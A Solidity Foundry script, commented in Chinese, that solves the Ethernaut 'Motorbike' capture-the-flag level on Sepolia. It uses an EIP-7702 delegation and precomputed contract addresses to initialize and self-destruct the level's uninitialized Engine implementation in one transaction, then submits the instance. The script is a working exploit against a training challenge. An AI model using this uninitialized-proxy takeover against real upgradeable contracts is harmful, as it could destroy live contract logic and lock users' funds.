// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Script.sol";
import "../src/26-Motorbike/solved/MotorbikeExploit.sol";

/**
 * @title MotorbikeExpFinal
 * @notice 使用 EIP-7702 + AddressHelper 预计算执行 Motorbike 攻击
 * 
 * 使用方法：
 * export MY_MAIN_PK=0x主账户私钥
 * export MY_SEC_PK=0x次要账户私钥
 * export sepolia_rpc=你的RPC
 * 
 * forge script script/MotorbikeExpFinal.s.sol:MotorbikeExpFinal \
 *     --rpc-url $sepolia_rpc --broadcast --skip-simulation -vvvv
 * 
 * 原理：
 * 1. 脚本获取 MotorbikeFactory 的当前 nonce
 * 2. 主账户通过 EIP-7702 委托给 MotorbikeExploitWrapper 合约
 * 3. 次要账户广播交易，调用主账户的 solve(nonce)
 * 4. 在一笔交易中：
 *    - 使用 AddressHelper 预计算 Engine 地址
 *    - 创建实例（Engine + Proxy）
 *    - 初始化 Engine
 *    - 销毁 Engine
 */
contract MotorbikeExpFinal is Script {
    MotorbikeExploit public implementation;
    
    address constant ETHERNAUT = 0xa3e7317E591D5A0F1c605be1b3aC4D2ae56104d6;
    address constant MOTORBIKE_LEVEL = 0x3A78EE8462BD2e31133de2B8f1f9CBD973D6eDd6;
    bytes32 constant IMPL_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    
    // 辅助函数：计算 CREATE 地址
    function _computeAddress(address deployer, uint256 nonce) internal pure returns (address) {
        if (nonce == 0x00) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, bytes1(0x80))))));
        }
        if (nonce <= 0x7f) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), deployer, uint8(nonce))))));
        }
        if (nonce <= 2**8 - 1) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd7), bytes1(0x94), deployer, bytes1(0x81), uint8(nonce))))));
        }
        if (nonce <= 2**16 - 1) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd8), bytes1(0x94), deployer, bytes1(0x82), uint16(nonce))))));
        }
        if (nonce <= 2**24 - 1) {
            return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd9), bytes1(0x94), deployer, bytes1(0x83), uint24(nonce))))));
        }
        return address(uint160(uint256(keccak256(abi.encodePacked(bytes1(0xda), bytes1(0x94), deployer, bytes1(0x84), uint32(nonce))))));
    }
    
    function run() external {
        console.log("===========================================================");
        console.log("Motorbike Attack - EIP-7702 + AddressHelper Solution");
        console.log("===========================================================\n");
        
        uint256 mainPk = vm.envUint("MY_MAIN_PK");
        uint256 secPk = vm.envUint("MY_SEC_PK");
        
        address mainAddr = vm.addr(mainPk);
        address secAddr = vm.addr(secPk);
        
        console.log("Main Address (delegator):", mainAddr);
        console.log("Secondary Address (caller):", secAddr);
        
        // Step 1: 获取 MotorbikeFactory 的当前 nonce
        console.log("\n=== Step 1: Get Level Nonce ===");
        uint64 levelNonce = vm.getNonce(MOTORBIKE_LEVEL);
        console.log("MotorbikeFactory nonce:", levelNonce);
        console.log("Predicted Engine address will be computed from this nonce");
        
        // Step 2: 部署实现合约
        console.log("\n=== Step 2: Deploy Implementation ===");
        vm.broadcast(mainPk);
        implementation = new MotorbikeExploit();
        console.log("Implementation deployed:", address(implementation));
        
        // Step 3: 主账户签署委托
        console.log("\n=== Step 3: Sign Delegation ===");
        console.log("Main address delegates code to implementation");
        
        VmSafe.SignedDelegation memory signedDelegation = vm.signDelegation(
            address(implementation),
            mainPk
        );
        console.log("Delegation signed successfully");
        
        // Step 4: 次要账户广播交易
        console.log("\n=== Step 4: Execute Attack (Single Transaction) ===");
        
        // 重新获取 nonce（可能在部署 wrapper 后发生了变化）
        uint64 nonceBeforeAttack = vm.getNonce(MOTORBIKE_LEVEL);
        console.log("MotorbikeFactory nonce BEFORE attack:", nonceBeforeAttack);
        
        // 预计算地址用于调试
        address predictedEngine = _computeAddress(MOTORBIKE_LEVEL, nonceBeforeAttack);
        address predictedProxy = _computeAddress(MOTORBIKE_LEVEL, nonceBeforeAttack + 1);
        console.log("Predicted Engine (nonce", nonceBeforeAttack, "):", predictedEngine);
        console.log("Predicted Proxy  (nonce", nonceBeforeAttack + 1, "):", predictedProxy);
        
        console.log("\nSecondary address broadcasts transaction");
        console.log("Attaching delegation and calling solve()...\n");
        
        // 关键：先 broadcast，再 attachDelegation，然后在同一个 broadcast 块内调用
        vm.broadcast(secPk);
        vm.attachDelegation(signedDelegation);
        
        // 作为 secAddr，通过 mainAddr 的委托代码执行交易
        address motorbike = MotorbikeExploit(mainAddr).solve(nonceBeforeAttack);
        
        // 验证后的 nonce
        uint64 nonceAfterAttack = vm.getNonce(MOTORBIKE_LEVEL);
        console.log("\nMotorbikeFactory nonce AFTER attack:", nonceAfterAttack);
        console.log("Nonce increased by:", nonceAfterAttack - nonceBeforeAttack);
        
        // Step 5: 验证结果
        console.log("\n=== Step 5: Verification ===");
        console.log("Motorbike Proxy:", motorbike);
        
        // 从 motorbike 读取 engine 地址
        bytes32 implSlot = vm.load(motorbike, IMPL_SLOT);
        address engine = address(uint160(uint256(implSlot)));
        console.log("Engine Implementation:", engine);
        
        // 检查 Engine 代码
        uint256 engineCodeSize;
        assembly {
            engineCodeSize := extcodesize(engine)
        }
        console.log("Engine code size:", engineCodeSize);
        
        if (engineCodeSize == 0) {
            console.log("[SUCCESS] Engine successfully destroyed!");
        } else {
            console.log("[WARNING] Engine code still exists");
        }
        
        // Step 6: 提交实例
        console.log("\n=== Step 6: Submit Instance ===");
        console.log("Submitting instance from main address...");
        
        // 使用新的 broadcast，避免 nonce 冲突
        vm.startBroadcast(mainPk);
        (bool success,) = ETHERNAUT.call(
            abi.encodeWithSignature("submitLevelInstance(address)", motorbike)
        );
        vm.stopBroadcast();
        
        if (success) {
            console.log("[SUCCESS] Instance submitted and validated!");
        } else {
            console.log("[WARNING] Instance submission failed");
        }
        
        console.log("\n===========================================================");
        console.log("FINAL RESULT:");
        if (success) {
            console.log("[SUCCESS] Level completed and submitted!");
        } else {
            console.log("[WARNING] Attack successful but submission needs manual retry");
            console.log("    Run: cast send", ETHERNAUT);
            console.log("         \"submitLevelInstance(address)\"", motorbike);
            console.log("         --rpc-url $sepolia_rpc --private-key $MY_MAIN_PK");
        }
        console.log("");
        console.log("How it worked:");
        console.log("  1. Script read MotorbikeFactory nonce:", levelNonce);
        console.log("  2. AddressHelper predicted Engine address");
        console.log("  3. Created instance in single transaction");
        console.log("  4. Initialized & destroyed Engine in same tx");
        console.log("===========================================================");
    }
}
